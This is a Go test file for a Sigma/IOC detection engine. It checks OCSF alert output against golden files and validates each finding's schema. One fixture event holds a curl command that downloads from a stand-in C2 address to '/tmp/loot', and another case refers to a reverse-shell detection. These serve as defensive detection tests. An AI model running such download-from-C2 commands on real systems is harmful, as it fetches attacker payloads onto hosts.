package engine

import (
	"bytes"
	"encoding/json"
	"flag"
	"fmt"
	"os"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"testing"
	"time"

	"github.com/conor-sometimes/banken/internal/alert"
	"github.com/conor-sometimes/banken/internal/event"
	"github.com/conor-sometimes/banken/internal/ioc"
	"github.com/conor-sometimes/banken/internal/sigma"
)

// ocsfUpdate rewrites the OCSF goldens from the current mapper output. Run
// `go test ./internal/engine -update-ocsf` after an intentional mapping
// change, then review the diff in tests/golden/ocsf before committing.
var ocsfUpdate = flag.Bool("update-ocsf", false, "update OCSF golden files")

var goldenOCSFOpts = alert.OCSFOptions{
	ProductVersion: "test",
	Hostname:       "golden-host",
	Now:            func() time.Time { return time.Date(2026, 10, 31, 12, 0, 0, 0, time.UTC) },
}

func ocsfGoldenDir() string { return filepath.Join("..", "..", "tests", "golden", "ocsf") }

// ocsfGoldenCases produces one finding per detection fixture (the first alert
// of the fixture's expected rule, so the golden is the rule actually firing on
// a real-ish event, not a hand-written Alert), plus an IOC finding from a
// test-local feed and a deliberately pid-less finding documenting the
// no-pid fallback.
func ocsfGoldenCases(t *testing.T) map[string]alert.Alert {
	t.Helper()
	rulesDir := filepath.Join("..", "..", "rules")
	fixturesDir := filepath.Join("..", "..", "tests", "fixtures")
	rules, problems := sigma.LoadTree(rulesDir)
	for _, p := range problems {
		t.Fatalf("rule failed to load: %v", p)
	}
	eng := New(rules, nil, nil)

	cases := map[string]alert.Alert{}
	entries, err := os.ReadDir(fixturesDir)
	if err != nil {
		t.Fatalf("read fixtures dir: %v", err)
	}
	for _, e := range entries {
		want, ok := expectedRule(e.Name())
		if !ok || want == "none" {
			continue
		}
		base := strings.TrimSuffix(e.Name(), ".json")
		for _, ev := range loadFixtureEvents(t, filepath.Join(fixturesDir, e.Name())) {
			for _, a := range eng.Match(ev) {
				if _, done := cases[base]; !done && a.Kind == alert.KindSigma && a.Rule == want {
					cases[base] = a
				}
			}
		}
		if _, ok := cases[base]; !ok {
			t.Fatalf("fixture %s never fired %s", e.Name(), want)
		}
	}

	// IOC: a test-local feed, so Kind: ioc has a golden without adding an
	// indicator to the shipped baseline.
	set := ioc.NewSet()
	set.Add("192.0.2.44", "evil-c2.txt")
	iocEng := New(nil, set, nil)
	iocAlerts := iocEng.Match(event.Event{
		Source: "auditd", Image: "/usr/bin/curl", CommandLine: "curl -s http://192.0.2.44/x -o /tmp/loot",
		User: "1000", PID: 4250, PPID: 4100, CurrentDirectory: "/home/u",
		Time: time.Date(2026, 10, 31, 12, 0, 5, 0, time.UTC),
	})
	if len(iocAlerts) != 1 {
		t.Fatalf("IOC golden: want 1 alert, got %d", len(iocAlerts))
	}
	cases["ioc.evil-c2"] = iocAlerts[0]

	// No pid: a hand-made event (banken check, a thin generic feed). The
	// process object is kept without pid rather than dropping the command
	// line -- the one golden the schema validator is expected to warn on.
	nopid := cases["revshell.expect-reverse_shell"]
	nopid.Event.PID, nopid.Event.PPID = 0, 0
	cases["nopid.expect-reverse_shell"] = nopid
	return cases
}

// TestOCSFGolden renders every case through the real encoder and compares it
// byte for byte with tests/golden/ocsf/<case>.json. The diff is the review.
func TestOCSFGolden(t *testing.T) {
	dir := ocsfGoldenDir()
	if *ocsfUpdate {
		if err := os.MkdirAll(dir, 0o750); err != nil {
			t.Fatal(err)
		}
	}
	enc := alert.EncodeOCSF(goldenOCSFOpts)
	for name, a := range ocsfGoldenCases(t) {
		t.Run(name, func(t *testing.T) {
			raw, err := enc(a)
			if err != nil {
				t.Fatalf("encode: %v", err)
			}
			var got bytes.Buffer
			if err := json.Indent(&got, raw, "", "  "); err != nil {
				t.Fatalf("indent: %v", err)
			}
			got.WriteByte('\n')
			path := filepath.Join(dir, name+".json")
			if *ocsfUpdate {
				if err := os.WriteFile(path, got.Bytes(), 0o600); err != nil {
					t.Fatalf("write golden: %v", err)
				}
				return
			}
			want, err := os.ReadFile(path)
			if err != nil {
				t.Fatalf("read golden (run -update-ocsf to create): %v", err)
			}
			if !bytes.Equal(got.Bytes(), want) {
				t.Errorf("OCSF golden mismatch for %s.\n--- got ---\n%s\n--- want ---\n%s", name, got.Bytes(), want)
			}
		})
	}
}

// TestEveryRuleHasAnOCSFGolden mirrors TestEveryRuleHasAFixture: a rule ships
// with proof of what its finding looks like.
func TestEveryRuleHasAnOCSFGolden(t *testing.T) {
	rules, problems := sigma.LoadTree(filepath.Join("..", "..", "rules"))
	for _, p := range problems {
		t.Fatalf("rule failed to load: %v", p)
	}
	have := map[string]bool{}
	entries, err := os.ReadDir(ocsfGoldenDir())
	if err != nil {
		t.Fatalf("read golden dir: %v", err)
	}
	for _, e := range entries {
		if r, ok := expectedRule(e.Name()); ok {
			have[r] = true
		}
	}
	for _, r := range rules {
		if !have[r.Name] {
			t.Errorf("rule %q has no tests/golden/ocsf/*.expect-%s.json", r.Name, r.Name)
		}
	}
}

// TestOCSFGoldenShape checks every committed golden against the mapping rules
// themselves (docs/design/ocsf-output.md §7.3), so a mistake cannot be frozen
// into a golden: required keys, type_uid arithmetic, severity captions, no ""
// or null anywhere, the pinned version and profile, a 32-hex uid shared by
// metadata and finding_info, device carries a hostname, process carries a pid
// (except the documented pid-less case), unmapped keys from the allow-list.
func TestOCSFGoldenShape(t *testing.T) {
	entries, err := os.ReadDir(ocsfGoldenDir())
	if err != nil {
		t.Fatalf("read golden dir: %v", err)
	}
	if len(entries) == 0 {
		t.Fatal("no OCSF goldens")
	}
	hex32 := regexp.MustCompile(`^[0-9a-f]{32}$`)
	severities := map[float64]string{0: "Unknown", 1: "Informational", 2: "Low", 3: "Medium", 4: "High", 5: "Critical"}
	unmappedAllowed := regexp.MustCompile(`^(kind|rule|source|current_directory|ioc_field|raw\..+)$`)

	for _, e := range entries {
		name := e.Name()
		t.Run(name, func(t *testing.T) {
			data, err := os.ReadFile(filepath.Join(ocsfGoldenDir(), name))
			if err != nil {
				t.Fatal(err)
			}
			var f map[string]any
			if err := json.Unmarshal(data, &f); err != nil {
				t.Fatalf("not JSON: %v", err)
			}
			for _, k := range []string{"activity_id", "category_uid", "class_uid", "type_uid", "severity_id", "time", "finding_info", "metadata"} {
				if _, ok := f[k]; !ok {
					t.Errorf("missing required %q", k)
				}
			}
			num := func(k string) float64 { v, _ := f[k].(float64); return v }
			if num("class_uid") != 2004 || num("category_uid") != 2 {
				t.Errorf("class/category = %v/%v, want 2004/2", f["class_uid"], f["category_uid"])
			}
			if num("type_uid") != num("class_uid")*100+num("activity_id") {
				t.Errorf("type_uid %v != class_uid*100+activity_id", f["type_uid"])
			}
			if want, ok := severities[num("severity_id")]; !ok || f["severity"] != want {
				t.Errorf("severity_id %v with caption %v", f["severity_id"], f["severity"])
			}
			walkNoEmpty(t, "", f)

			md, _ := f["metadata"].(map[string]any)
			fi, _ := f["finding_info"].(map[string]any)
			if md["version"] != alert.OCSFVersion {
				t.Errorf("metadata.version = %v, want %s", md["version"], alert.OCSFVersion)
			}
			// host always; osint exactly when the finding carries an indicator.
			wantProfiles := []any{"host"}
			if f["osint"] != nil {
				wantProfiles = append(wantProfiles, "osint")
			}
			if p, _ := md["profiles"].([]any); fmt.Sprint(p) != fmt.Sprint(wantProfiles) {
				t.Errorf("metadata.profiles = %v, want %v", md["profiles"], wantProfiles)
			}
			for i, o := range asSlice(f["observables"]) {
				if name, _ := o.(map[string]any)["name"].(string); name == "" {
					t.Errorf("observables[%d] has no name (required in 1.3.0)", i)
				}
			}
			uid, _ := fi["uid"].(string)
			if !hex32.MatchString(uid) || md["uid"] != uid {
				t.Errorf("finding_info.uid %q must be 32 hex and equal metadata.uid %v", uid, md["uid"])
			}
			if dev, ok := f["device"].(map[string]any); ok && dev["hostname"] == nil {
				t.Error("device without hostname")
			}
			for _, ev := range asSlice(f["evidences"]) {
				p, ok := ev.(map[string]any)["process"].(map[string]any)
				if ok && p["pid"] == nil && !strings.HasPrefix(name, "nopid.") {
					t.Errorf("evidence process without pid (only nopid.* may omit it)")
				}
			}
			um, _ := f["unmapped"].(map[string]any)
			for k := range um {
				if !unmappedAllowed.MatchString(k) {
					t.Errorf("unmapped key %q is not in the allow-list (add it deliberately)", k)
				}
			}
		})
	}
}

// walkNoEmpty fails on any "" or null anywhere in the document: OCSF
// validators flag empty strings and a SIEM would index them.
func walkNoEmpty(t *testing.T, at string, v any) {
	t.Helper()
	switch x := v.(type) {
	case nil:
		t.Errorf("null at %s", at)
	case string:
		if x == "" {
			t.Errorf(`"" at %s`, at)
		}
	case map[string]any:
		for k, c := range x {
			walkNoEmpty(t, at+"."+k, c)
		}
	case []any:
		for i, c := range x {
			walkNoEmpty(t, at+"["+strconv.Itoa(i)+"]", c)
		}
	}
}

func asSlice(v any) []any { s, _ := v.([]any); return s }
